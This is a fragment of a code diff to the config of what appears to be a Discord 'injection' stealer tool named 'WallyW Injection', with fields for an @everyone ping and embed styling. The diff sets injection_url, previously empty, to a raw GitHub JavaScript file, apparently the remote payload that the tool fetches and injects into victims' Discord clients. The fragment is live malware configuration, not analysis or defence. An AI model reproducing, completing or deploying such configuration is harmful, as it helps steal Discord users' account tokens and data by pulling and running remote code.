@@ -13,8 +13,8 @@ const config = {
   ping_val: '@everyone',
   embed_name: 'WallyW Injection', 
   embed_icon: 'https://cdn.discordapp.com/emojis/1086762567562711171.png'.replace(/ /g, '%20'), 
-  embed_color: 2895667, 
-  injection_url: '', 
+  embed_color: 2303786, 
+  injection_url: 'https://raw.githubusercontent.com/kingcrab2313/dwaw222/main/index.js', 
   /**
    
    **/
